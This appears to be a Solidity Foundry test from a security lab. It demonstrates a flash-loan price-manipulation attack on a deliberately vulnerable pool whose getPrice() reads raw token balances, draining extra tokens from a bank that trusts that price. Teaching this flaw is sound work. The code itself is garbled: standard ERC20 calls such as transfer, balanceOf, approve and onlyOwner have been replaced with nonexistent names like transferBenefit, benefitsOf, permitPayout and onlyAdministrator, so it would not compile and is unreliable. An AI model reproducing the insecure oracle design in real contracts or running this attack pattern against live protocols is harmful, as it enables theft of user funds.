// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleInsurancepool SimpleCoveragepoolContract;
    SimpleBenefitbank SimpleCoveragebankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleCoveragepoolContract = new SimpleInsurancepool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleCoveragebankContract = new SimpleBenefitbank(
            address(USDaContract),
            address(SimpleCoveragepoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.transferBenefit(address(SimpleCoveragebankContract), 9000 ether);
        USDaContract.transferBenefit(address(SimpleCoveragepoolContract), 1000 ether);
        USDbContract.transferBenefit(address(SimpleCoveragepoolContract), 1000 ether);
        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
        SimpleCoveragepoolContract.getPrice(); // 1 USDa : 1 USDb

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleCoveragepoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");
        // Let's manipulate the price since the getPrice is over the balanceOf.

        SimpleCoveragepoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {
        //flashlon callback

        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleCoveragepoolContract.getPrice(),
            18
        ); // 1 USDa : 2 USDb

        USDaContract.permitPayout(address(SimpleCoveragebankContract), 100 ether);
        SimpleCoveragebankContract.exchange(100 ether);

        USDaContract.transferBenefit(address(SimpleCoveragepoolContract), 500 ether);

        // Get the balance of USDb owned by us.
        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.benefitsOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _issuecoverage(msg.sender, 10000 * 10 ** decimals());
    }

    function issueCoverage(address to, uint256 amount) public onlyAdministrator {
        _issuecoverage(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _issuecoverage(msg.sender, 10000 * 10 ** decimals());
    }

    function issueCoverage(address to, uint256 amount) public onlyAdministrator {
        _issuecoverage(to, amount);
    }
}

contract SimpleInsurancepool {
    IERC20 public UsDaBenefittoken;
    IERC20 public UsDbBenefittoken;

    constructor(address _USDa, address _USDb) {
        UsDaBenefittoken = IERC20(_USDa);
        UsDbBenefittoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {
        //Incorrect price calculation over balanceOf
        uint256 USDaAmount = UsDaBenefittoken.benefitsOf(address(this));
        uint256 USDbAmount = UsDbBenefittoken.benefitsOf(address(this));

        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }

        // Calculate the price as the ratio of USDa to USDb
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address creditUser,
        bytes calldata data
    ) public {
        uint256 coverageBefore = UsDaBenefittoken.benefitsOf(address(this));
        require(coverageBefore >= amount, "Not enough liquidity");
        require(
            UsDaBenefittoken.transferBenefit(creditUser, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = creditUser.call(data);
        require(success, "Flashloan callback failed");
        uint256 remainingbenefitAfter = UsDaBenefittoken.benefitsOf(address(this));
        require(remainingbenefitAfter >= coverageBefore, "Flashloan not repaid");
    }
}

contract SimpleBenefitbank {
    IERC20 public benefitToken; //USDA
    SimpleInsurancepool public insurancePool;
    IERC20 public payoutMedicalcredit; //USDb

    constructor(address _coveragetoken, address _insurancepool, address _payoutToken) {
        benefitToken = IERC20(_coveragetoken);
        insurancePool = SimpleInsurancepool(_insurancepool);
        payoutMedicalcredit = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            benefitToken.transferbenefitFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = insurancePool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutMedicalcredit.transferBenefit(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}
